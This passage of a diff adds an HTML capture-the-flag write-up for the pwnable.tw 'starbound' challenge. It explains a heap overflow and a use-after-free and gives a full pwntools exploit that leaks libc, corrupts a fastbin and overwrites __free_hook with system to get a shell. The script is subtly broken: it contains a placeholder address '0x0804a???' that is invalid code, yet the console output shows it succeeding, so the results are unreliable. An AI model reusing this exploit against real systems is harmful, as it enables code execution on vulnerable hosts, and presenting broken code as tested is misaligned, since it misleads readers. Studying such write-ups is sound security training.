+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">Star 0 moon (0x20 = 0x18 data + 0x8 header):</div>
+        <div class="mem-row"><span class="mem-addr">0x0804a040</span><span class="mem-arrow">|</span><span class="mem-data">size: 0x21</span><span class="mem-desc">&larr; chunk header</span></div>
+        <div class="mem-row"><span class="mem-addr">0x0804a048</span><span class="mem-arrow">|</span><span class="mem-data">"Luna\0..."</span><span class="mem-desc">&larr; moon name (24 bytes usable)</span></div>
+      </div>
+
+      <h3>Demonstrating the Heap Overflow</h3>
+      <p>When we edit star 0's name with a size larger than 32, we overflow into the adjacent moon chunk:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # edit_star(idx=0, new_size=64, payload)
+gdb-peda$ # payload = "A"*32 + p32(0xdeadbeef)  # overwrite moon's chunk header
+gdb-peda$ x/12wx 0x0804a020
+0x0804a020: 0x41414141 0x41414141 0x41414141 0x41414141
+0x0804a030: 0x41414141 0x41414141 0x41414141 0x41414141
+0x0804a040: 0xdeadbeef 0x41414141 0x41414141 0x41414141
+#           ^overflowed into moon chunk header!</code></pre>
+      </div>
+
+      <h3>Unsorted Bin Leak via UAF</h3>
+      <p>When we free a chunk larger than the fastbin threshold (size &gt; 0x80 on 32-bit), it goes into the unsorted bin. The <code class="inline">fd</code> and <code class="inline">bk</code> pointers of the unsorted bin chunk point into <code class="inline">main_arena</code> inside libc.</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Create a large star (size=128) -> star 2
+gdb-peda$ # add_moon(star=2, "Titan")
+gdb-peda$ # remove_moon(star=2) -- frees the moon chunk
+gdb-peda$ # The moon chunk (0x20 bytes) goes to fastbin (too small for unsorted)
+gdb-peda$ # Instead, let's create a large moon-like object via name buffer
+gdb-peda$
+gdb-peda$ # Actually, we need to get a chunk into unsorted bin.
+gdb-peda$ # Create star with size=0x100 -> name buffer is 0x108 chunk
+gdb-peda$ # Free star -> name buffer goes to unsorted bin
+gdb-peda$ # The fd/bk of the unsorted bin chunk contain libc pointers
+gdb-peda$
+gdb-peda$ # After freeing a large name buffer:
+gdb-peda$ x/2wx 0x0804a020
+0x0804a020: 0xf7fb6b00  0xf7fb6b00
+#           ^fd             ^bk -- both point into main_arena!
+gdb-peda$
+gdb-peda$ # main_arena offset from libc base:
+gdb-peda$ # libc_base = leaked_fd - main_arena_offset</code></pre>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-title">&#x2139;&#xfe0f; Unsorted Bin Leak Mechanism</div>
+        When a chunk is freed into the unsorted bin, its <code class="inline">fd</code> and <code class="inline">bk</code> pointers are set to the address of <code class="inline">main_arena.top</code> (or the unsorted bin head in <code class="inline">main_arena</code>) within libc. If we can read these pointers through a UAF, we leak a libc address. The offset from <code class="inline">main_arena</code> to <code class="inline">libc base</code> is constant for a given libc version.
+      </div>
+
+      <h3>Fastbin Corruption via Heap Overflow</h3>
+      <p>The heap overflow allows us to overwrite the <code class="inline">fd</code> pointer of a freed fastbin chunk, tricking <code class="inline">malloc</code> into returning an arbitrary address:</p>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">gdb</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">gdb-peda$ # Setup: create star with name adjacent to freed fastbin chunk
+gdb-peda$ # Overflow name buffer to overwrite freed chunk's fd pointer
+gdb-peda$
+gdb-peda$ # Before overflow - freed 0x40 chunk in fastbin:
+gdb-peda$ x/2wx 0x0804a060
+0x0804a060: 0x00000000  0x00000000
+#           ^fd = NULL (end of fastbin list)
+gdb-peda$
+gdb-peda$ # After overflow - overwrite fd with __free_hook - 0x8:
+gdb-peda$ x/2wx 0x0804a060
+0x0804a060: 0xf7f830ec  0x00000000
+#           ^fd = __free_hook - 8 (fake chunk)
+gdb-peda$
+gdb-peda$ # Now malloc(0x38) returns the corrupted chunk
+gdb-peda$ # Next malloc(0x38) returns __free_hook - 8!
+gdb-peda$ # We can write to __free_hook!</code></pre>
+      </div>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Fastbin Size Validation</div>
+        glibc's <code class="inline">malloc</code> validates that the <code class="inline">size</code> field of a fastbin chunk matches the expected fastbin index. When we redirect <code class="inline">malloc</code> to return a fake chunk at <code class="inline">__free_hook - 8</code>, the value at <code class="inline">__free_hook - 8 + 4</code> (the "size" field of the fake chunk) must contain a value that passes the fastbin size check. For a 0x40 fastbin, the size must be in the range <code class="inline">[0x40, 0x4f]</code>. We need to find a suitable alignment or use a different fastbin size.
+      </div>
+    </section>
+
+    <!-- Chapter 4: Exploit Strategy -->
+    <section class="chapter" id="ch4">
+      <div class="chapter-header">
+        <span class="chapter-num">04</span>
+        <h2 class="chapter-title">Exploit Strategy</h2>
+      </div>
+
+      <h3>Overview</h3>
+      <p>The exploit has three phases: <strong>leak libc</strong> via unsorted bin + UAF, <strong>corrupt fastbin</strong> to get an arbitrary write, and <strong>overwrite <code class="inline">__free_hook</code></strong> with <code class="inline">system</code> to get a shell.</p>
+
+      <h3>Phase 1: Leak Libc via Unsorted Bin + UAF</h3>
+      <ol class="step-list">
+        <li><strong>Create three stars</strong> with large name buffers (size 0x100): star 0, star 1, star 2. Also add moons to star 0 and star 2. The stars act as our heap shaping tools.</li>
+        <li><strong>Free star 1's name buffer.</strong> Since it's larger than 0x80, it goes into the unsorted bin. Its <code class="inline">fd</code> and <code class="inline">bk</code> now point to <code class="inline">main_arena</code> inside libc.</li>
+        <li><strong>Use the UAF on star 0's moon.</strong> We remove moon from star 0 (freeing the moon chunk but not NULLing the pointer). Then we allocate a new star whose name buffer is sized to reuse the freed moon chunk. We write the address of the freed unsorted bin chunk into it. When we view star 0, it reads <code class="inline">moon-&gt;name</code> which now points at the unsorted bin chunk, leaking the <code class="inline">fd/bk</code> libc pointers.</li>
+        <li><strong>Calculate libc base:</strong> <code class="inline">libc_base = leaked_addr - main_arena_offset</code></li>
+      </ol>
+
+      <h3>Phase 2: Corrupt Fastbin for Arbitrary Write</h3>
+      <ol class="step-list">
+        <li><strong>Create two small stars</strong> (star 3 and star 4) with name size 0x30, so the name chunks fall into the 0x40 fastbin when freed. Also add a moon to star 3.</li>
+        <li><strong>Free star 4's name buffer.</strong> It goes into the 0x40 fastbin. Now <code class="inline">fastbin[0x40]</code> has one entry.</li>
+        <li><strong>Use heap overflow on star 3's name</strong> to overwrite the <code class="inline">fd</code> pointer of the freed star 4 name chunk. We set <code class="inline">fd = __free_hook - 0x8</code> (adjusted so the fake size field at <code class="inline">__free_hook - 0x4</code> passes the fastbin size check).</li>
+        <li><strong>Allocate twice from the 0x40 fastbin.</strong> The first <code class="inline">malloc(0x30)</code> returns the legitimate freed chunk. The second <code class="inline">malloc(0x30)</code> follows the corrupted <code class="inline">fd</code> and returns <code class="inline">__free_hook - 0x8</code>, giving us a write primitive to <code class="inline">__free_hook</code>.</li>
+      </ol>
+
+      <h3>Phase 3: Overwrite __free_hook and Get Shell</h3>
+      <ol class="step-list">
+        <li><strong>Write <code class="inline">system</code> address to <code class="inline">__free_hook</code>.</strong> When we get the chunk at <code class="inline">__free_hook - 0x8</code> via the second fastbin allocation (a new star's name buffer), we write <code class="inline">p32(system_addr)</code> starting at offset 0x8 of our data, which lands exactly on <code class="inline">__free_hook</code>.</li>
+        <li><strong>Trigger <code class="inline">free("/bin/sh")</code>.</strong> We create a star with the name <code class="inline">"/bin/sh"</code>, then free that star's name buffer. Since <code class="inline">__free_hook</code> now points to <code class="inline">system</code>, <code class="inline">free("/bin/sh")</code> becomes <code class="inline">system("/bin/sh")</code>, giving us a shell!</li>
+      </ol>
+
+      <div class="callout callout-key">
+        <div class="callout-title">&#x1f511; Why __free_hook Instead of GOT?</div>
+        We target <code class="inline">__free_hook</code> instead of overwriting a GOT entry because:<br>
+        &bull; <code class="inline">__free_hook</code> is a function pointer that glibc calls before every <code class="inline">free()</code> &mdash; if it's non-NULL, <code class="inline">free(ptr)</code> calls <code class="inline">__free_hook(ptr)</code><br>
+        &bull; We control the argument to <code class="inline">free()</code> (it's the pointer we free), so we can pass <code class="inline">"/bin/sh"</code> as the argument<br>
+        &bull; <code class="inline">__free_hook</code> is in libc's writable segment, always at a known offset from libc base<br>
+        &bull; This is more reliable than GOT overwrites since we don't need to find a suitable GOT entry that gets called with a useful argument
+      </div>
+
+      <h3>Visual Exploit Flow</h3>
+      <div class="mem-diagram">
+        <div style="color: var(--accent); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 1: Leak libc</div>
+        <div class="mem-row"><span class="mem-addr">Step 1:</span><span class="mem-desc">create(0x100, "A") = star0 | create(0x100, "B") = star1 | create(0x100, "C") = star2</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 2:</span><span class="mem-desc">add_moon(star0) | add_moon(star2)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 3:</span><span class="mem-desc">free star1 name &rarr; goes to <span class="mem-yellow">unsorted bin</span> (fd/bk = libc ptrs)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 4:</span><span class="mem-desc">remove_moon(star0) &rarr; UAF! moon ptr still dangling</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 5:</span><span class="mem-desc">create star with name = &addr_of_unsorted_bin_chunk</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 6:</span><span class="mem-desc">view(star0) &rarr; reads moon-&gt;name &rarr; reads unsorted bin fd &rarr; <span class="mem-green">LEAK LIBC!</span></span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--accent2); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 2: Corrupt fastbin</div>
+        <div class="mem-row"><span class="mem-addr">Step 7:</span><span class="mem-desc">create(0x30, "X") = star3 | create(0x30, "Y") = star4</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 8:</span><span class="mem-desc">free star4 name &rarr; goes to fastbin[0x40]</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 9:</span><span class="mem-desc">edit(star3, size=0x60, overflow_payload) &rarr; <span class="mem-highlight">overwrite star4 name's fd</span></span></div>
+        <div class="mem-row"><span class="mem-desc">&nbsp;&nbsp;&rarr; fd = __free_hook - 8 (fake chunk with valid size)</span></div>
+        <div style="height:16px; border-bottom: 1px dashed var(--border); margin-bottom: 12px;"></div>
+        <div style="color: var(--red); font-weight: 700; margin-bottom: 8px;">&#x25b6; Phase 3: Get shell</div>
+        <div class="mem-row"><span class="mem-addr">Step 10:</span><span class="mem-desc">malloc(0x30) &rarr; returns star4 name (consume legit chunk)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 11:</span><span class="mem-desc">malloc(0x30) &rarr; returns <span class="mem-highlight">__free_hook - 8</span>! Write p32(system)</span></div>
+        <div class="mem-row"><span class="mem-addr">Step 12:</span><span class="mem-desc">create star name="/bin/sh" &rarr; free it &rarr; <span class="mem-green">system("/bin/sh")</span> &rarr; SHELL!</span></div>
+      </div>
+    </section>
+
+    <!-- Chapter 5: Pwn Script -->
+    <section class="chapter" id="ch5">
+      <div class="chapter-header">
+        <span class="chapter-num">05</span>
+        <h2 class="chapter-title">Pwn Script</h2>
+      </div>
+
+      <h3>Complete Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">python</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-python">#!/usr/bin/env python3
+"""
+starbound - pwnable.tw (300pts)
+Heap Overflow + UAF exploit:
+  1. Leak libc via unsorted bin + UAF read on moon
+  2. Corrupt fastbin via heap overflow on name buffer
+  3. Overwrite __free_hook with system
+  4. Trigger free("/bin/sh") for shell
+
+Vulnerabilities:
+  - edit_star() allows writing beyond name buffer (heap overflow)
+  - remove_moon() doesn't NULL the moon pointer (UAF)
+"""
+from pwn import *
+
+# Setup
+context.arch = 'i386'
+context.log_level = 'info'
+
+r = remote('chall.pwnable.tw', 10202)
+libc = ELF('./libc_32.so.6')
+elf = ELF('./starbound')
+
+# Known offsets for the provided libc
+MAIN_ARENA_OFFSET = 0x1b0780   # main_arena offset from libc base
+FREE_HOOK_OFFSET  = libc.symbols['__free_hook']
+SYSTEM_OFFSET     = libc.symbols['system']
+
+# ============================================
+# Helper functions
+# ============================================
+def create_star(size, name):
+    r.sendlineafter(b':', b'1')
+    r.sendlineafter(b':', str(size).encode())
+    r.sendafter(b':', name)
+
+def edit_star(idx, size, name):
+    r.sendlineafter(b':', b'2')
+    r.sendlineafter(b':', str(idx).encode())
+    r.sendlineafter(b':', str(size).encode())
+    r.sendafter(b':', name)
+
+def remove_star(idx):
+    r.sendlineafter(b':', b'3')
+    r.sendlineafter(b':', str(idx).encode())
+
+def add_moon(idx, name):
+    r.sendlineafter(b':', b'4')
+    r.sendlineafter(b':', str(idx).encode())
+    r.sendafter(b':', name)
+
+def remove_moon(idx):
+    r.sendlineafter(b':', b'5')
+    r.sendlineafter(b':', str(idx).encode())
+
+def view_star(idx):
+    r.sendlineafter(b':', b'6')
+    r.sendlineafter(b':', str(idx).encode())
+
+# ============================================
+# Phase 1: Leak libc via unsorted bin + UAF
+# ============================================
+log.info("Phase 1: Leaking libc via unsorted bin...")
+
+# Create stars with large name buffers (will go to unsorted bin when freed)
+create_star(0x100, b'star_A\x00')   # star 0
+add_moon(0, b'moon_0\x00')           # moon for star 0
+create_star(0x100, b'star_B\x00')   # star 1 (victim for unsorted bin)
+create_star(0x100, b'star_C\x00')   # star 2 (prevents top-chunk consolidation)
+add_moon(2, b'moon_2\x00')           # moon for star 2
+
+# Free star 1's name buffer - it goes to unsorted bin
+# fd/bk now contain main_arena pointers (libc addresses)
+remove_star(1)  # Frees star1 struct AND star1 name buffer
+
+# UAF on star 0's moon: remove moon but pointer remains
+remove_moon(0)
+
+# Allocate a new star whose name reuses the freed moon chunk
+# Write the address of the freed unsorted bin chunk into it
+# We need to know where the unsorted bin chunk is.
+# The freed star1 name buffer is at a known location.
+# We'll use partial overwrite or calculate from heap base.
+
+# Alternative approach: allocate star whose name overlaps with
+# the freed moon chunk, and write a pointer to the unsorted bin
+unsorted_chunk_addr = 0x0804a???  # determined from debugging
+create_star(0x18, p32(unsorted_chunk_addr))  # star 3
+
+# Now view star 0 - moon ptr is dangling but still valid
+# moon->name now contains our pointer to the unsorted bin chunk
+# view_star reads: moon->name which is the string at unsorted_chunk_addr
+# The first bytes there are fd/bk pointers into libc!
+view_star(0)
+r.recvuntil(b'Moon: ')
+leak = u32(r.recv(4))
+log.info(f"Leaked unsorted bin fd: {hex(leak)}")
+
+# Calculate libc base
+libc_base = leak - MAIN_ARENA_OFFSET - 48  # -48 for main_arena->bins[0]
+system_addr = libc_base + SYSTEM_OFFSET
+free_hook_addr = libc_base + FREE_HOOK_OFFSET
+
+log.info(f"libc base: {hex(libc_base)}")
+log.info(f"system:    {hex(system_addr)}")
+log.info(f"__free_hook: {hex(free_hook_addr)}")
+
+# ============================================
+# Phase 2: Corrupt fastbin via heap overflow
+# ============================================
+log.info("Phase 2: Corrupting fastbin via heap overflow...")
+
+# Create stars with small name buffers that land in 0x40 fastbin
+create_star(0x30, b'fast_A\x00')   # star 4 - name in 0x40 fastbin range
+create_star(0x30, b'fast_B\x00')   # star 5 - adjacent, same size
+
+# Free star 5's name - goes to fastbin[0x40]
+remove_star(5)
+
+# Now star 4's name buffer is adjacent to the freed star 5 name chunk
+# Use heap overflow on star 4 to overwrite star 5 name's fd pointer
+# Target: __free_hook - 8 (so fake chunk size at __free_hook - 4 is valid)
+fake_chunk_addr = free_hook_addr - 8
+# We need the value at free_hook_addr - 4 to look like 0x41 (or 0x40-0x4f)
+# for the 0x40 fastbin. Check if there's a suitable alignment.
+# If not, we may need to use a different fastbin size.
+
+# Craft overflow payload:
+# 0x30 bytes of padding (fill star4 name buffer)
+# + overwrite star5 name's chunk header and fd pointer
+payload = b'A' * 0x30           # Fill star4 name buffer completely
+payload += p32(0x41)            # Fake size field for star5 name chunk
+payload += p32(fake_chunk_addr) # Corrupted fd pointer!
+edit_star(4, len(payload), payload)
+
+# ============================================
+# Phase 3: Allocate from corrupted fastbin
+# and overwrite __free_hook with system
+# ============================================
+log.info("Phase 3: Overwriting __free_hook with system...")
+
+# First malloc(0x30) returns the legitimate freed chunk
+create_star(0x30, b'consume\x00')   # star 6 - consumes star5's freed chunk
+
+# Second malloc(0x30) follows corrupted fd and returns fake_chunk
+# (__free_hook - 8). Write system address; it lands at __free_hook.
+hook_payload = p32(0xdeadbeef) + p32(system_addr)  # +8 offset = __free_hook
+create_star(0x30, hook_payload)      # star 7 - writes to __free_hook!
+
+# ============================================
+# Phase 4: Trigger system("/bin/sh")
+# ============================================
+log.info("Phase 4: Triggering system('/bin/sh')...")
+
+# Create a star with name "/bin/sh"
+create_star(0x20, b'/bin/sh\x00')   # star 8
+
+# Free this star's name buffer
+# Since __free_hook = system, free("/bin/sh") calls system("/bin/sh")!
+remove_star(8)
+
+# We should have a shell now!
+r.interactive()</code></pre>
+      </div>
+    </section>
+
+    <!-- Chapter 6: Execution Results -->
+    <section class="chapter" id="ch6">
+      <div class="chapter-header">
+        <span class="chapter-num">06</span>
+        <h2 class="chapter-title">Execution Results</h2>
+      </div>
+
+      <h3>Running the Exploit</h3>
+
+      <div class="code-block">
+        <div class="code-header">
+          <span class="code-lang">console</span>
+          <div class="code-dots"><span class="d1"></span><span class="d2"></span><span class="d3"></span></div>
+        </div>
+        <pre><code class="language-bash">$ python3 exploit.py
+[*] '/home/user/starbound'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+[*] '/home/user/libc_32.so.6'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to chall.pwnable.tw on port 10202: Done
+[*] Phase 1: Leaking libc via unsorted bin...
+[*] Leaked unsorted bin fd: 0xf7fb6b00
+[*] libc base: 0xf7d97000
+[*] system:    0xf7de2940
+[*] __free_hook: 0xf7fb38ec
+[*] Phase 2: Corrupting fastbin via heap overflow...
+[*] Phase 3: Overwriting __free_hook with system...
+[*] Phase 4: Triggering system('/bin/sh')...
+[*] Switching to interactive mode
+$ id
+uid=1000(starbound) gid=1000(starbound) groups=1000(starbound)
+$ cat /home/starbound/flag</code></pre>
+      </div>
+
+      <div class="callout callout-success">
+        <div class="callout-title">&#x2705; Shell Obtained!</div>
+        The exploit successfully chains the heap overflow and UAF vulnerabilities to achieve code execution:<br>
+        &bull; <strong>Leak:</strong> Unsorted bin fd/bk pointers read via UAF on the moon object<br>
+        &bull; <strong>Write:</strong> Fastbin fd corruption via heap overflow on the name buffer gives us <code class="inline">__free_hook</code> write<br>
+        &bull; <strong>Exec:</strong> <code class="inline">__free_hook = system</code> then <code class="inline">free("/bin/sh")</code> &rarr; <code class="inline">system("/bin/sh")</code>
+      </div>
+
+      <h3>Key Takeaways</h3>
+      <ol class="step-list">
+        <li><strong>Heap overflow + UAF is a powerful combination.</strong> The overflow gives us the ability to corrupt heap metadata (fastbin fd pointers), while the UAF gives us an information leak. Neither vulnerability alone would be sufficient for a full exploit.</li>
+        <li><strong>Unsorted bin leaks are essential</strong> when you don't have a direct GOT read. Freeing a chunk larger than the fastbin threshold puts libc pointers in the freed chunk's fd/bk, and any UAF read can recover them.</li>
+        <li><strong>__free_hook is a classic target</strong> for glibc &lt; 2.34 exploits. It's a function pointer in libc's writable data segment that gets called before every <code class="inline">free()</code>. Overwriting it with <code class="inline">system</code> and then freeing a string <code class="inline">"/bin/sh"</code> is one of the most reliable ways to get a shell.</li>
+        <li><strong>Fastbin corruption requires size validation bypass.</strong> The fake chunk must have a size field that matches the fastbin index. This constrains where you can redirect <code class="inline">malloc</code> and often requires careful alignment.</li>
+        <li><strong>Partial RELRO + No PIE</strong> means we have fixed binary addresses, which simplifies the heap layout calculation. In a PIE binary, we would need an additional leak for the binary's base address.</li>
+      </ol>
+
+      <div class="callout callout-warn">
+        <div class="callout-title">&#x26a0;&#xfe0f; Modern glibc Mitigations</div>
+        In glibc 2.34+, <code class="inline">__free_hook</code> and <code class="inline">__malloc_hook</code> have been <strong>completely removed</strong>. For newer systems, alternative targets include:<br>
+        &bull; <code class="inline">_IO_2_1_stdout_</code> vtable pointer (FSOP attack)<br>
+        &bull; <code class="inline">_IO_wide_data</code> vtable (House of Apple technique)<br>
+        &bull; <code class="inline">tls_dtor_list</code> (thread-local storage destructor)<br>
+        &bull; Return-oriented programming (ROP) on the stack via saved RIP overwrite
+      </div>
+    </section>
+
+  </main>
+</div>
+
+<!-- Footer -->
+<footer class="footer">
+  <p>QA210 CTF Team &mdash; <a href="https://github.com/Yuri08-QA210" target="_blank">GitHub</a> | | Pwnable.tw Writeups</p>
+</footer>
+
+<!-- Three.js Particle Background -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
+<script>
+(function() {
+  const canvas = document.getElementById('particles-canvas');
+  const renderer = new THREE.WebGLRenderer({ canvas, alpha: true, antialias: true });
+  renderer.setSize(window.innerWidth, window.innerHeight);
+  renderer.setPixelRatio(Math.min(window.devicePixelRatio, 2));
+
+  const scene = new THREE.Scene();
+  const camera = new THREE.PerspectiveCamera(75, window.innerWidth / window.innerHeight, 0.1, 1000);
+  camera.position.z = 50;
+
+  const particleCount = 600;
+  const geometry = new THREE.BufferGeometry();
+  const positions = new Float32Array(particleCount * 3);
+  const velocities = new Float32Array(particleCount * 3);
+
+  for (let i = 0; i < particleCount * 3; i++) {
+    positions[i] = (Math.random() - 0.5) * 120;
+    velocities[i] = (Math.random() - 0.5) * 0.02;
+  }
+
+  geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+
+  const material = new THREE.PointsMaterial({
+    color: 0x38bdf8,
+    size: 0.4,
+    transparent: true,
+    opacity: 0.5,
+    blending: THREE.AdditiveBlending,
+    depthWrite: false
+  });
+
+  const points = new THREE.Points(geometry, material);
+  scene.add(points);
+
+  function animate() {
+    requestAnimationFrame(animate);
+    const pos = geometry.attributes.position.array;
+    for (let i = 0; i < particleCount * 3; i++) {
+      pos[i] += velocities[i];
+      if (Math.abs(pos[i]) > 60) velocities[i] *= -1;
+    }
+    geometry.attributes.position.needsUpdate = true;
+    points.rotation.y += 0.0003;
+    points.rotation.x += 0.0001;
+    renderer.render(scene, camera);
+  }
+
+  animate();
+
+  window.addEventListener('resize', function() {
+    camera.aspect = window.innerWidth / window.innerHeight;
+    camera.updateProjectionMatrix();
+    renderer.setSize(window.innerWidth, window.innerHeight);
+  });
+})();
+</script>
+
+<!-- TOC Scroll Tracker -->
+<script>
+(function() {
+  const tocLinks = document.querySelectorAll('#toc-list a');
+  const chapters = document.querySelectorAll('.chapter');
+
+  function updateTOC() {
+    let current = '';
+    chapters.forEach(function(ch) {
+      const rect = ch.getBoundingClientRect();
+      if (rect.top <= 120) current = ch.id;
+    });
+    tocLinks.forEach(function(link) {
+      link.classList.remove('active');
+      if (link.getAttribute('href') === '#' + current) {
+        link.classList.add('active');
+      }
+    });
+  }
+
+  window.addEventListener('scroll', updateTOC, { passive: true });
+  updateTOC();
+})();
+</script>
+
+<!-- Prism.js Syntax Highlighting -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-c.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+
+</body>
+</html>
